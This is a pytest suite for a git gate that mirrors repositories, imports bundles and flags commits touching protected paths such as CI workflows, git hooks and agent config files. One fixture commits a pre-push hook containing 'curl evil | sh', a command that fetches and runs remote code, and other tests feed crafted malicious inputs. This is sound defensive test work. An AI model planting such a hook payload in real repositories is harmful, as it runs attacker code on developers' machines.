import os
import subprocess
from pathlib import Path

import pytest

from conftest import TOKEN, commit, git
from git_gate import Refused
from git_gate.config import DEFAULT_HANDOVER_PATHS, canonical_pattern, load_rules
from git_gate.gitops import Git
from git_gate.mirror import Mirror, Protected, protected, reaches

REPO = "me/app"


@pytest.fixture
def m(env):
    return Mirror(env.gate.git, env.state)


@pytest.fixture
def rules(env):
    return load_rules(env.cfg)


def mgit(m: Mirror, *args: str) -> str:
    return git(f"--git-dir={m.path(REPO)}", *args)


def bundle(checkout: Path, out: Path, *refs: str) -> Path:
    git("bundle", "create", "-q", str(out), *refs, "--not", "--remotes=origin", cwd=checkout)
    return out


def seed_push(env, path: str, content: str = "x") -> str:
    seed = env.tmp / "seed"
    sha = commit(seed, path, content)
    git("push", "-q", env.url, "main", cwd=seed)
    return sha


def canon(*patterns: str) -> tuple[str, ...]:
    return tuple(canonical_pattern(p) for p in patterns)


# --- matching ------------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("path", "pattern", "expected"),
    [
        ("skills/x", "skills", True),
        ("skillsx", "skills", False),
        (".github/workflows", None, True),
        (".GitHub/Workflows/ci.yml", None, True),
        ("x/.pre-commit-config.yaml", None, False),
        (".github/workflows/a.yml", ".github/*", True),
        ("skills/a/b/c", "skills/*/b", True),
        ("anything", "**", True),
        (".claude/settings.json", None, True),
        (".mcp.json", None, True),
        (".vscode/tasks.json", None, True),
        (".github/dependabot.yml", None, False),
    ],
)
def test_protected_table(path, pattern, expected):
    patterns = DEFAULT_HANDOVER_PATHS if pattern is None else canon(pattern)
    assert protected(path, patterns) is expected


@pytest.mark.parametrize(
    ("path", "pattern", "expected"),
    [
        (".github", None, True),
        (".githooks", None, True),
        ("skills/x", "skills/*/hooks/**", True),
        ("docs", None, False),
        ("a/b", "**/hooks", True),
        ("skills/x/y", "skills/*.md", False),
    ],
)
def test_reaches_table(path, pattern, expected):
    patterns = DEFAULT_HANDOVER_PATHS if pattern is None else canon(pattern)
    assert reaches(path, patterns) is expected


# --- path, sync ----------------------------------------------------------------------------


def test_mirror_is_bare_under_state(env, m):
    p = m.path(REPO)
    assert p == env.state / "mirrors/me/app.git"
    assert git(f"--git-dir={p}", "rev-parse", "--is-bare-repository") == "true"
    assert not (p / "hooks").exists()
    assert m.path("Me/App") == p


def test_sync_mirrors_heads_and_prunes(env, m, rules):
    seed = env.tmp / "seed"
    main = git("rev-parse", "HEAD", cwd=seed)
    git("push", "-q", env.url, "main:refs/heads/gone", "main:refs/heads/topic/x", cwd=seed)
    with m.lock(REPO):
        assert m.sync(REPO, TOKEN, rules) == {"main": main, "gone": main, "topic/x": main}
    git("update-ref", "-d", "refs/heads/gone", cwd=env.bare)
    new = seed_push(env, "b.txt")
    assert m.sync(REPO, TOKEN, rules) == {"main": new, "topic/x": main}
    assert mgit(m, "for-each-ref", "--format=%(refname)") == "refs/heads/main\nrefs/heads/topic/x"
    assert mgit(m, "tag") == ""


def test_sync_empty_remote(env, m, rules):
    git("init", "-q", "--bare", str(env.remote / "me/empty.git"))
    assert m.sync("me/empty", TOKEN, rules) == {}


# --- import --------------------------------------------------------------------------------


def test_import_bundle_returns_branch_sha(env, m, rules, checkout):
    git("switch", "-q", "-c", "feat", cwd=checkout)
    commit(checkout, "a.txt")
    tip = commit(checkout, "b.txt")
    b = bundle(checkout, env.state / "tmp" / "push.bundle", "feat")
    m.sync(REPO, TOKEN, rules)
    assert m.import_bundle(REPO, b, "feat", rules) == tip
    mgit(m, "cat-file", "-e", f"{tip}^{{commit}}")
    mgit(m, "fsck", "--no-progress", "--no-dangling")
    assert mgit(m, "for-each-ref", "--format=%(refname)", "refs/heads/") == "refs/heads/main"


def test_import_twice_and_nested_names(env, m, rules, checkout):
    git("switch", "-q", "-c", "feat", cwd=checkout)
    commit(checkout, "a.txt")
    m.sync(REPO, TOKEN, rules)
    m.import_bundle(REPO, bundle(checkout, env.state / "tmp" / "1.bundle", "feat"), "feat", rules)
    git("switch", "-q", "--detach", cwd=checkout)
    git("branch", "-q", "-D", "feat", cwd=checkout)
    git("switch", "-q", "-c", "feat/x", cwd=checkout)
    tip = commit(checkout, "b.txt")
    assert m.import_bundle(REPO, bundle(checkout, env.state / "tmp" / "2.bundle", "feat/x"), "feat/x", rules) == tip
    git("commit", "-q", "--amend", "-m", "rewritten", cwd=checkout)
    rewritten = git("rev-parse", "HEAD", cwd=checkout)
    assert (
        m.import_bundle(REPO, bundle(checkout, env.state / "tmp" / "3.bundle", "feat/x"), "feat/x", rules) == rewritten
    )
    assert mgit(m, "for-each-ref", "--format=%(refname)", "refs/gate/") == "refs/gate/incoming/feat/x"


@pytest.mark.parametrize("extra", [["other"], ["v1"], ["HEAD"], "only-tag", "wrong-branch"])
def test_import_refuses_extra_refs(env, m, rules, checkout, extra):
    git("switch", "-q", "-c", "feat", cwd=checkout)
    commit(checkout, "a.txt")
    git("branch", "other", cwd=checkout)
    git("tag", "v1", cwd=checkout)
    if extra == "only-tag":
        refs, branch = ["v1"], "feat"
    elif extra == "wrong-branch":
        refs, branch = ["other"], "feat"
    else:
        refs, branch = ["feat", *extra], "feat"
    b = bundle(checkout, env.state / "tmp" / "push.bundle", *refs)
    m.sync(REPO, TOKEN, rules)
    with pytest.raises(Refused, match="exactly one ref"):
        m.import_bundle(REPO, b, branch, rules)
    assert mgit(m, "for-each-ref", "refs/gate/") == ""


def test_import_refuses_corrupt_bundle(env, m, rules, checkout):
    git("switch", "-q", "-c", "feat", cwd=checkout)
    commit(checkout, "a.txt", "some content " * 50)
    m.sync(REPO, TOKEN, rules)
    m.import_bundle(REPO, bundle(checkout, env.state / "tmp" / "good.bundle", "feat"), "feat", rules)
    assert mgit(m, "for-each-ref", "refs/gate/incoming/") != ""
    commit(checkout, "b.txt", "other content " * 50)
    b = bundle(checkout, env.state / "tmp" / "bad.bundle", "feat")
    data = bytearray(b.read_bytes())
    start = data.index(b"PACK") + 12
    for i in range(start + 8, min(start + 40, len(data) - 20)):
        data[i] ^= 0xFF
    b.write_bytes(bytes(data))
    with pytest.raises(Refused):
        m.import_bundle(REPO, b, "feat", rules)
    assert mgit(m, "for-each-ref", "refs/gate/incoming/") == ""


def test_import_refuses_non_bundle(env, m, rules):
    b = env.state / "tmp" / "junk.bundle"
    b.write_text("not a bundle\n")
    with pytest.raises(Refused, match="not a git bundle"):
        m.import_bundle(REPO, b, "feat", rules)


def test_import_missing_prerequisites(env, m, rules, checkout):
    """A stale origin/* ref names a commit GitHub never had, so the bundle's prerequisite is missing."""
    git("switch", "-q", "-c", "local", cwd=checkout)
    unpushed = commit(checkout, "local.txt")
    git("update-ref", "refs/remotes/origin/gone", unpushed, cwd=checkout)
    git("switch", "-q", "-c", "feat", cwd=checkout)
    commit(checkout, "feat.txt")
    b = bundle(checkout, env.state / "tmp" / "push.bundle", "feat")
    m.sync(REPO, TOKEN, rules)
    with pytest.raises(Refused) as e:
        m.import_bundle(REPO, b, "feat", rules)
    msg = str(e.value)
    assert "run the gate's fetch" in msg
    assert "--not" in msg
    assert unpushed[:12] in msg
    assert mgit(m, "for-each-ref", "refs/gate/") == ""


def test_import_refuses_bad_branch_name(env, m, rules):
    b = env.state / "tmp" / "x.bundle"
    b.write_text("x")
    with pytest.raises(Refused, match="branch name"):
        m.import_bundle(REPO, b, "-x", rules)


def _no_git(*args, **kwargs):
    raise AssertionError("git ran on a refused bundle path")


@pytest.mark.parametrize("kind", ["directory", "symlink", "outside", "fifo", "via-symlinked-dir", "missing"])
def test_import_requires_regular_file_in_state(env, m, rules, checkout, monkeypatch, kind):
    """git fetch would read a directory as a repository; only a regular file in gate storage is unbundled."""
    git("switch", "-q", "-c", "feat", cwd=checkout)
    commit(checkout, "a.txt")
    good = bundle(checkout, env.state / "tmp" / "good.bundle", "feat")
    target = env.state / "tmp" / f"{kind}.bundle"
    if kind == "directory":
        target.mkdir()
    elif kind == "symlink":
        target.symlink_to(good)
    elif kind == "outside":
        target = bundle(checkout, env.tmp / "outside.bundle", "feat")
    elif kind == "fifo":
        os.mkfifo(target)
    elif kind == "via-symlinked-dir":
        bundle(checkout, env.tmp / "elsewhere.bundle", "feat")
        (env.state / "tmp" / "out").symlink_to(env.tmp)
        target = env.state / "tmp" / "out" / "elsewhere.bundle"
    m.path(REPO)
    monkeypatch.setattr(m.git, "run", _no_git)
    with pytest.raises(Refused, match="bundle"):
        m.import_bundle(REPO, target, "feat", rules)


# --- export --------------------------------------------------------------------------------


def _fetch_into_new(env, b: Path, name: str) -> dict[str, str]:
    repo = env.tmp / name
    git("init", "-q", str(repo), cwd=env.tmp)
    git("fetch", "-q", str(b), "+refs/heads/*:refs/remotes/origin/*", cwd=repo)
    out = git("for-each-ref", "--format=%(refname:lstrip=3) %(objectname)", "refs/remotes/origin/", cwd=repo)
    return dict(line.split(" ") for line in out.splitlines())


def _fetch_into(repo: Path, b: Path) -> dict[str, str]:
    git("fetch", "-q", str(b), "+refs/heads/*:refs/remotes/origin/*", cwd=repo)
    out = git("for-each-ref", "--format=%(refname:lstrip=3) %(objectname)", "refs/remotes/origin/", cwd=repo)
    return dict(line.split(" ") for line in out.splitlines() if not line.startswith("HEAD "))


def _heads_of(b: Path) -> dict[str, str]:
    out = git("bundle", "list-heads", str(b))
    return {ref.removeprefix("refs/heads/"): sha for sha, ref in (line.split(" ") for line in out.splitlines())}


def test_export_full_and_incremental(env, m, rules, checkout):
    seed = env.tmp / "seed"
    m1 = seed_push(env, "m1.txt")
    git("fetch", "-q", "origin", cwd=checkout)  # the agent now has m1
    m2 = seed_push(env, "m2.txt")
    git("switch", "-q", "-c", "dev", cwd=seed)
    dev = commit(seed, "dev.txt", "dev " * 200)
    git("push", "-q", env.url, "dev", cwd=seed)
    m.sync(REPO, TOKEN, rules)

    full = env.tmp / "full.bundle"
    assert m.export_bundle(REPO, full, [], rules) is True
    assert _fetch_into_new(env, full, "fresh") == {"main": m2, "dev": dev}

    part = env.tmp / "part.bundle"
    assert m.export_bundle(REPO, part, [m1], rules) is True
    assert part.stat().st_size < full.stat().st_size
    assert _heads_of(part) == {"main": m2, "dev": dev}
    assert _fetch_into(checkout, part) == {"main": m2, "dev": dev}

    tip = env.tmp / "tip.bundle"
    assert m.export_bundle(REPO, tip, [m2], rules) is True
    assert _heads_of(tip) == {"main": m2, "dev": dev}

    every = env.tmp / "every.bundle"
    assert m.export_bundle(REPO, every, [m2, dev], rules) is True
    assert _heads_of(every) == {"main": m2, "dev": dev}


def test_export_always_lists_every_branch(env, m, rules, checkout):
    """A have list carries no branch names: a new branch at a known commit must still arrive."""
    main = git("rev-parse", "HEAD", cwd=checkout)
    git("push", "-q", env.url, f"{main}:refs/heads/release-1", cwd=env.tmp / "seed")
    m.sync(REPO, TOKEN, rules)
    out = env.tmp / "known.bundle"
    assert m.export_bundle(REPO, out, [main], rules) is True
    assert _heads_of(out) == {"main": main, "release-1": main}
    assert _fetch_into(checkout, out) == {"main": main, "release-1": main}
    again = env.tmp / "again.bundle"
    assert m.export_bundle(REPO, again, [main, main], rules) is True
    assert set(_heads_of(again)) == {"main", "release-1"}


def test_export_false_only_without_branches(env, m, rules):
    git("init", "-q", "--bare", str(env.remote / "me/empty.git"))
    m.sync("me/empty", TOKEN, rules)
    for have in ([], ["a" * 40]):
        out = env.tmp / "out.bundle"
        assert m.export_bundle("me/empty", out, have, rules) is False
        assert not out.exists()
    main = seed_push(env, "b.txt")
    m.sync(REPO, TOKEN, rules)
    assert m.export_bundle(REPO, env.tmp / "one.bundle", [main], rules) is True


def test_export_keeps_branches_whose_tips_the_agent_has(env, m, rules, checkout):
    """A branch at a known commit, or fast-forwarded to one, still reaches origin/* in the clone."""
    seed = env.tmp / "seed"
    m1 = seed_push(env, "m1.txt")
    git("switch", "-q", "-c", "dev", cwd=seed)
    d1 = commit(seed, "d1.txt")
    git("push", "-q", env.url, "dev", cwd=seed)
    git("fetch", "-q", "origin", cwd=checkout)  # the agent has main=m1, dev=d1
    d2 = commit(seed, "d2.txt")
    git("push", "-q", env.url, "dev", f"{d1}:refs/heads/main", f"{m1}:refs/heads/at-known", cwd=seed)
    m.sync(REPO, TOKEN, rules)

    out = env.tmp / "inc.bundle"
    assert m.export_bundle(REPO, out, [m1, d1], rules) is True
    expected = {"main": d1, "dev": d2, "at-known": m1}
    assert _heads_of(out) == expected
    assert _fetch_into(checkout, out) == expected


def test_export_keeps_a_branch_behind_every_have(env, m, rules, checkout):
    """A tip below a have's parents would be excluded by rev-list; the bundle still carries it."""
    root = git("rev-parse", "HEAD", cwd=checkout)
    seed_push(env, "m1.txt")
    m2 = seed_push(env, "m2.txt")
    git("fetch", "-q", "origin", cwd=checkout)
    m3 = seed_push(env, "m3.txt")
    git("push", "-q", env.url, f"{root}:refs/heads/old", cwd=env.tmp / "seed")
    m.sync(REPO, TOKEN, rules)

    out = env.tmp / "old.bundle"
    assert m.export_bundle(REPO, out, [m2], rules) is True
    expected = {"main": m3, "old": root}
    assert _heads_of(out) == expected
    assert _fetch_into(checkout, out) == expected


def test_export_empty_mirror(env, m, rules):
    git("init", "-q", "--bare", str(env.remote / "me/empty.git"))
    m.sync("me/empty", TOKEN, rules)
    out = env.tmp / "out.bundle"
    assert m.export_bundle("me/empty", out, [], rules) is False
    assert not out.exists()


def test_export_ignores_unknown_have(env, m, rules):
    main = seed_push(env, "b.txt")
    m.sync(REPO, TOKEN, rules)
    tree = mgit(m, "rev-parse", "main^{tree}")
    have = ["0" * 40, "nothex", "--all", main.upper(), main[:12], tree, "", "f" * 64]
    out = env.tmp / "out.bundle"
    assert m.export_bundle(REPO, out, have, rules) is True
    assert _fetch_into_new(env, out, "fresh") == {"main": main}
    with pytest.raises(Refused, match="1000"):
        m.export_bundle(REPO, env.tmp / "cap.bundle", ["0" * 40] * 1001, rules)
    assert m.export_bundle(REPO, env.tmp / "ok.bundle", ["0" * 40] * 999 + [main], rules) is True


# --- ancestry ------------------------------------------------------------------------------


def test_ancestry_helpers(env, m, rules, checkout):
    base = git("rev-parse", "HEAD", cwd=checkout)
    git("switch", "-q", "-c", "feat", cwd=checkout)
    commit(checkout, "a.txt")
    tip = commit(checkout, "b.txt")
    m.sync(REPO, TOKEN, rules)
    m.import_bundle(REPO, bundle(checkout, env.state / "tmp" / "p.bundle", "feat"), "feat", rules)
    upstream = seed_push(env, "up.txt")
    m.sync(REPO, TOKEN, rules)
    assert m.is_ancestor(REPO, base, tip, rules) is True
    assert m.is_ancestor(REPO, upstream, tip, rules) is False
    assert m.merge_base(REPO, upstream, tip, rules) == base
    assert len(m.new_commits(REPO, tip, upstream, rules)) == 2
    everything = m.new_commits(REPO, tip, None, rules)
    assert len(everything) == 3 and base in everything
    assert m.new_commits(REPO, base, upstream, rules) == []
    git("switch", "-q", "--orphan", "lonely", cwd=checkout)
    orphan = commit(checkout, "o.txt")
    m.import_bundle(REPO, bundle(checkout, env.state / "tmp" / "o.bundle", "lonely"), "lonely", rules)
    assert m.merge_base(REPO, orphan, tip, rules) is None
    with pytest.raises(Refused):
        m.is_ancestor(REPO, "--all", tip, rules)


# --- protected_changes ---------------------------------------------------------------------

WF = ".github/workflows/ci.yml"
NONE = Protected((), ())


def _changes(env, m, rules, checkout, branch, patterns=DEFAULT_HANDOVER_PATHS) -> tuple[str, Protected]:
    """Bundle `branch` from the checkout, import it, and run the check as push will."""
    heads = m.sync(REPO, TOKEN, rules)
    sha = m.import_bundle(REPO, bundle(checkout, env.state / "tmp" / f"{branch}.bundle", branch), branch, rules)
    return sha, m.protected_changes(REPO, sha, heads.get(branch), heads.get("main"), patterns, rules)


def user_branch(env, name: str, path: str, content: str) -> str:
    """The user pushes `name` to GitHub: main plus one commit writing `path`."""
    seed = env.tmp / "seed"
    git("switch", "-q", "-c", name, "main", cwd=seed)
    sha = commit(seed, path, content)
    git("push", "-q", env.url, name, cwd=seed)
    git("switch", "-q", "main", cwd=seed)
    return sha


def test_protected_is_falsy_without_files():
    assert not NONE
    assert not Protected((), ("a" * 40,))
    assert Protected((WF,), ())


def test_protected_changes_names_workflow_commits(env, m, rules, checkout):
    git("switch", "-q", "-c", "ci", cwd=checkout)
    commit(checkout, "a.txt")
    one = commit(checkout, WF, "on: push")
    two = commit(checkout, WF, "on: [push]")
    assert _changes(env, m, rules, checkout, "ci")[1] == Protected((WF,), (one, two))


def test_protected_changes_changed_and_changed_back(env, m, rules, checkout):
    """The net diff is empty for the file; the commits being pushed still touched it."""
    git("switch", "-q", "-c", "roundtrip", cwd=checkout)
    one = commit(checkout, ".githooks/pre-push", "curl evil | sh")
    git("rm", "-q", ".githooks/pre-push", cwd=checkout)
    git("commit", "-q", "-m", "tidy", cwd=checkout)
    two = git("rev-parse", "HEAD", cwd=checkout)
    commit(checkout, "ok.txt")
    assert _changes(env, m, rules, checkout, "roundtrip")[1] == Protected((".githooks/pre-push",), (one, two))


def test_protected_changes_deleting_workflow_by_rename(env, m, rules, checkout):
    seed_push(env, WF, "on: push")
    git("fetch", "-q", "origin", cwd=checkout)
    git("switch", "-q", "-c", "mv", "origin/main", cwd=checkout)
    git("mv", WF, "ci.yml", cwd=checkout)
    git("commit", "-q", "-m", "move", cwd=checkout)
    sha, found = _changes(env, m, rules, checkout, "mv")
    assert found == Protected((WF,), (sha,))


def test_protected_changes_clean_merge_of_main_passes(env, m, rules, checkout):
    git("switch", "-q", "-c", "topic", cwd=checkout)
    commit(checkout, "topic.txt")
    seed_push(env, WF, "on: push")
    git("fetch", "-q", "origin", cwd=checkout)
    git("merge", "-q", "--no-edit", "origin/main", cwd=checkout)
    assert _changes(env, m, rules, checkout, "topic")[1] == NONE


def test_protected_changes_evil_merge(env, m, rules, checkout):
    seed_push(env, WF, "on: push")
    git("fetch", "-q", "origin", cwd=checkout)
    git("switch", "-q", "-c", "topic", "main", cwd=checkout)
    commit(checkout, "topic.txt")
    git("merge", "-q", "--no-commit", "origin/main", cwd=checkout)
    (checkout / WF).write_text("on: everything")
    git("add", ".", cwd=checkout)
    git("commit", "-q", "--no-edit", cwd=checkout)
    merge, found = _changes(env, m, rules, checkout, "topic")
    assert found == Protected((WF,), (merge,))


def test_protected_changes_rollback_merge_names_the_file(env, m, rules, checkout):
    """Dense-combined diffs hide a merge that keeps one parent's older workflow; the tree check must not."""
    old = seed_push(env, WF, "v1")
    seed_push(env, WF, "v2")
    git("fetch", "-q", "origin", cwd=checkout)
    git("switch", "-q", "-c", "side", old, cwd=checkout)
    commit(checkout, "side.txt")
    git("switch", "-q", "-c", "topic", "origin/main", cwd=checkout)
    commit(checkout, "topic.txt")
    git("merge", "-q", "--no-commit", "side", cwd=checkout)
    git("checkout", "side", "--", WF, cwd=checkout)
    git("commit", "-q", "--no-edit", cwd=checkout)
    assert (checkout / WF).read_text() == "v1"
    assert _changes(env, m, rules, checkout, "topic")[1] == Protected((WF,), ())


def test_protected_changes_stale_fork_with_old_workflows_is_protected(env, m, rules, checkout):
    """Main gaining a workflow fix after the fork: a new branch there would run the old workflows."""
    git("switch", "-q", "-c", "topic", cwd=checkout)
    commit(checkout, "topic.txt")
    seed_push(env, WF, "on: push")
    assert _changes(env, m, rules, checkout, "topic")[1] == Protected((WF,), ())


def test_protected_changes_stale_fork_without_workflow_drift_passes(env, m, rules, checkout):
    git("switch", "-q", "-c", "topic", cwd=checkout)
    commit(checkout, "topic.txt")
    seed_push(env, "docs/later.md", "later")
    assert _changes(env, m, rules, checkout, "topic")[1] == NONE


def test_protected_changes_existing_branch_merges_main_after_user_workflow_change_passes(env, m, rules, checkout):
    """The user's own workflow commit on main, merged into a pushed branch, is not re-checked."""
    git("switch", "-q", "-c", "topic", cwd=checkout)
    commit(checkout, "topic.txt")
    git("push", "-q", env.url, "topic", cwd=checkout)
    seed_push(env, WF, "on: push")
    git("fetch", "-q", "origin", cwd=checkout)
    git("merge", "-q", "--no-edit", "origin/main", cwd=checkout)
    assert _changes(env, m, rules, checkout, "topic")[1] == NONE


def test_protected_changes_existing_branch_keeping_its_old_workflows_passes(env, m, rules, checkout):
    seed_push(env, WF, "v1")
    git("fetch", "-q", "origin", cwd=checkout)
    git("switch", "-q", "-c", "topic", "origin/main", cwd=checkout)
    commit(checkout, "topic.txt")
    git("push", "-q", env.url, "topic", cwd=checkout)
    seed_push(env, WF, "v2")
    commit(checkout, "more.txt")
    assert _changes(env, m, rules, checkout, "topic")[1] == NONE


def test_protected_changes_rewrite_with_new_protected_content(env, m, rules, checkout):
    seed_push(env, WF, "v1")
    user_branch(env, "feat", WF, "v2")
    git("fetch", "-q", "origin", cwd=checkout)
    git("switch", "-q", "-c", "feat", "origin/main", cwd=checkout)
    v3 = commit(checkout, WF, "v3")
    assert _changes(env, m, rules, checkout, "feat")[1] == Protected((WF,), (v3,))


def test_protected_changes_rewrite_back_to_the_fork_version_is_not_protected(env, m, rules, checkout):
    """Dropping the user's workflow edit is still a rewrite (a lease handover), not a protected change."""
    seed_push(env, WF, "v1")
    user_branch(env, "feat", WF, "v2")
    git("fetch", "-q", "origin", cwd=checkout)
    git("switch", "-q", "-c", "feat", "origin/main", cwd=checkout)
    commit(checkout, "other.txt")
    assert _changes(env, m, rules, checkout, "feat")[1] == NONE


def test_protected_changes_fast_forward_keeping_the_remotes_protected_change_passes(env, m, rules, checkout):
    seed_push(env, WF, "v1")
    user_branch(env, "feat", WF, "v2")
    git("fetch", "-q", "origin", cwd=checkout)
    git("switch", "-q", "-c", "feat", "origin/feat", cwd=checkout)
    commit(checkout, "other.txt")
    assert _changes(env, m, rules, checkout, "feat")[1] == NONE


def test_protected_changes_against_existing_remote_branch(env, m, rules, checkout):
    git("switch", "-q", "-c", "topic", cwd=checkout)
    commit(checkout, "topic.txt")
    git("push", "-q", env.url, "topic", cwd=checkout)
    git("fetch", "-q", "origin", cwd=checkout)
    wf = commit(checkout, WF)
    commit(checkout, "more.txt")
    assert _changes(env, m, rules, checkout, "topic")[1] == Protected((WF,), (wf,))


def test_protected_changes_no_default_branch_checks_all_history(env, m, rules, checkout):
    git("switch", "-q", "--orphan", "fresh", cwd=checkout)
    root = commit(checkout, ".githooks/x")
    m.sync(REPO, TOKEN, rules)
    sha = m.import_bundle(REPO, bundle(checkout, env.state / "tmp" / "f.bundle", "fresh"), "fresh", rules)
    assert sha == root
    assert m.protected_changes(REPO, sha, None, None, DEFAULT_HANDOVER_PATHS, rules) == Protected(
        (".githooks/x",), (root,)
    )


def test_protected_changes_ignores_replace_refs(env, m, rules, checkout):
    """refs/replace could make a workflow commit look harmless; the gate's git disables replacements."""
    git("switch", "-q", "-c", "sneaky", cwd=checkout)
    bad = commit(checkout, WF, "on: push")
    git("switch", "-q", "main", cwd=checkout)
    git("switch", "-q", "-c", "decoy", cwd=checkout)
    good = commit(checkout, "ok.txt")
    git("push", "-q", env.url, "sneaky", "decoy", cwd=checkout)
    heads = m.sync(REPO, TOKEN, rules)
    mgit(m, "replace", bad, good)
    assert mgit(m, "for-each-ref", "refs/replace/") != ""
    main = heads["main"]
    assert m.new_commits(REPO, bad, main, rules) == [bad]
    assert m.protected_changes(REPO, bad, None, main, DEFAULT_HANDOVER_PATHS, rules) == Protected((WF,), (bad,))


def test_protected_changes_never_compares_with_other_branches(env, m, rules, checkout):
    """A workflow staged on a branch the agent pushed is still new to the default branch."""
    git("switch", "-q", "-c", "agent", cwd=checkout)
    evil = commit(checkout, WF, "on: push")
    git("push", "-q", env.url, "agent", cwd=checkout)
    git("switch", "-q", "-c", "innocent", cwd=checkout)
    commit(checkout, "innocent.txt")
    assert _changes(env, m, rules, checkout, "innocent")[1] == Protected((WF,), (evil,))


def test_protected_changes_fork_point(env, m, rules, checkout):
    base = git("rev-parse", "HEAD", cwd=checkout)
    git("switch", "-q", "-c", "topic", cwd=checkout)
    commit(checkout, "a.txt")
    tip = seed_push(env, "later.txt")
    sha, _ = _changes(env, m, rules, checkout, "topic")
    assert m.fork_point(REPO, sha, tip, rules) == base
    assert m.fork_point(REPO, sha, None, rules) is None
    git("switch", "-q", "--orphan", "lonely", cwd=checkout)
    commit(checkout, "o.txt")
    lonely, _ = _changes(env, m, rules, checkout, "lonely")
    assert m.fork_point(REPO, lonely, tip, rules) is None


def test_protected_changes_non_utf8_name(env, m, rules, checkout):
    """git prints raw bytes; a name that is not UTF-8 is matched and kept, never a decode error."""
    git("switch", "-q", "-c", "raw", cwd=checkout)
    blob = git("hash-object", "-w", "--stdin", cwd=checkout, input="#!/bin/sh\n")
    git("update-index", "--add", "--cacheinfo", f"100644,{blob},.githooks/\udcff", cwd=checkout)
    git("commit", "-q", "-m", "raw \udcfe name", cwd=checkout)
    sha = git("rev-parse", "HEAD", cwd=checkout)
    assert _changes(env, m, rules, checkout, "raw")[1] == Protected((".githooks/\udcff",), (sha,))


@pytest.mark.parametrize(
    ("path", "extra", "hit"),
    [
        (".githooks/pre-commit", (), True),
        (".pre-commit-config.yaml", (), True),
        (".github/workflows/sub/x.yml", (), True),
        (".claude/settings.json", (), True),
        (".mcp.json", (), True),
        (".vscode/tasks.json", (), True),
        (".idea/workspace.xml", (), True),
        (".envrc", (), True),
        (".devcontainer/devcontainer.json", (), True),
        ("skills/x.md", (), False),
        ("skills/x.md", ("skills/**",), True),
        ("skills/x.md", ("skills",), True),
        ("docs/.pre-commit-config.yaml", (), False),
        (".github/dependabot.yml", (), False),
        (".GITHUB/workflows/ci.yml", (), True),
        (".GitHooks/pre-commit", (), True),
        (".Pre-Commit-Config.YAML", (), True),
        ("Skills/X.md", ("skills/**",), True),
        ("skills/x.md", ("SKILLS/**",), True),
        # patterns are canonicalised
        ("skills/x.md", ("/skills/**",), True),
        ("skills/x.md", ("skills/",), True),
        ("skills/x.md", ("./skills/**",), True),
        ("skills", ("/skills/**",), True),
        ("skills", ("skills/",), True),
        ("skills", ("./skills/**",), True),
        ("skills/x.md", ("./",), True),
        ("skillset/x.md", ("skills/",), False),
    ],
)
def test_protected_changes_patterns(env, m, rules, checkout, path, extra, hit):
    git("switch", "-q", "-c", "topic", cwd=checkout)
    sha = commit(checkout, path)
    found = _changes(env, m, rules, checkout, "topic", DEFAULT_HANDOVER_PATHS + canon(*extra))[1]
    assert found == (Protected((path,), (sha,)) if hit else NONE)


def test_protected_changes_pattern_directory_as_file(env, m, rules, checkout):
    """A file at the pattern's directory (`.github/workflows` itself) is a handover path too.

    A regular file `skills` cannot hold anything `skills/*.md` names, so it is not one (a symlink
    there would be: see `reaches`).
    """
    git("switch", "-q", "-c", "topic", cwd=checkout)
    sha = commit(checkout, ".github/workflows", "not a directory")
    assert _changes(env, m, rules, checkout, "topic")[1] == Protected((".github/workflows",), (sha,))
    git("switch", "-q", "-c", "sk", "main", cwd=checkout)
    commit(checkout, "skills", "file")
    assert _changes(env, m, rules, checkout, "sk", canon("skills/*.md"))[1] == NONE


# --- push, handover refs -------------------------------------------------------------------


def test_push_from_mirror(env, m, rules, checkout):
    git("switch", "-q", "-c", "feat", cwd=checkout)
    tip = commit(checkout, "a.txt")
    git("tag", "v1", cwd=checkout)
    m.sync(REPO, TOKEN, rules)
    sha = m.import_bundle(REPO, bundle(checkout, env.state / "tmp" / "p.bundle", "feat"), "feat", rules)
    proc = m.push(REPO, sha, "feat", TOKEN, rules)
    assert isinstance(proc, subprocess.CompletedProcess)
    assert proc.returncode == 0, proc.stderr
    assert git("rev-parse", "refs/heads/feat", cwd=env.bare) == tip
    assert git("tag", cwd=env.bare) == ""
    git("switch", "-q", "main", cwd=checkout)
    other = commit(checkout, "b.txt")
    git("push", "-q", env.url, "main:refs/heads/elsewhere", cwd=checkout)
    m.sync(REPO, TOKEN, rules)
    rejected = m.push(REPO, other, "feat", TOKEN, rules)
    assert rejected.returncode != 0
    assert git("rev-parse", "refs/heads/feat", cwd=env.bare) == tip


def test_push_refuses_bad_inputs(env, m, rules):
    sha = seed_push(env, "b.txt")
    m.sync(REPO, TOKEN, rules)
    with pytest.raises(Refused):
        m.push(REPO, sha, "-x", TOKEN, rules)
    with pytest.raises(Refused):
        m.push(REPO, "main", "feat", TOKEN, rules)


def test_keep_and_drop_handover_refs(env, m, rules):
    sha = seed_push(env, "b.txt")
    m.sync(REPO, TOKEN, rules)
    m.keep(REPO, "refs/gate/handover/7", sha, rules)
    assert mgit(m, "rev-parse", "refs/gate/handover/7") == sha
    m.drop(REPO, "refs/gate/handover/7", rules)
    assert mgit(m, "for-each-ref", "refs/gate/") == ""
    m.drop(REPO, "refs/gate/handover/7", rules)
    for bad in ("refs/heads/main", "refs/gate/handover/x", "refs/gate/handover/7/../8", "refs/gate/incoming/7"):
        with pytest.raises(Refused):
            m.keep(REPO, bad, sha, rules)
        with pytest.raises(Refused):
            m.drop(REPO, bad, rules)
    with pytest.raises(Refused):
        m.keep(REPO, "refs/gate/handover/8", "1" * 40, rules)
    m.keep(REPO, "refs/gate/handover/8", sha, rules)
    with pytest.raises(Refused, match="not a commit SHA"):
        m.keep(REPO, "refs/gate/handover/8", "0" * 40, rules)  # the null SHA would delete the ref
    assert mgit(m, "rev-parse", "refs/gate/handover/8") == sha


# --- Git.user_push_url ---------------------------------------------------------------------


def test_user_push_url(env, tmp_path):
    assert Git(tmp_path / "s1", "https://github.com").user_push_url(REPO) == "git@github.com:me/app.git"
    assert env.gate.git.user_push_url(REPO) == env.url
    assert Git(tmp_path / "s2", "https://ghe.example.com/").user_push_url(REPO) == "https://ghe.example.com/me/app.git"


def test_import_under_github_protocol_allowlist(env, rules, checkout, tmp_path):
    """With base_url https, the gate's config allows only https; reading a bundle file still works."""
    m = Mirror(Git(tmp_path / "s", "https://github.com"), tmp_path / "s")
    git("switch", "-q", "--orphan", "fresh", cwd=checkout)
    root = commit(checkout, "a.txt")
    b = bundle(checkout, tmp_path / "s/tmp/f.bundle", "fresh")
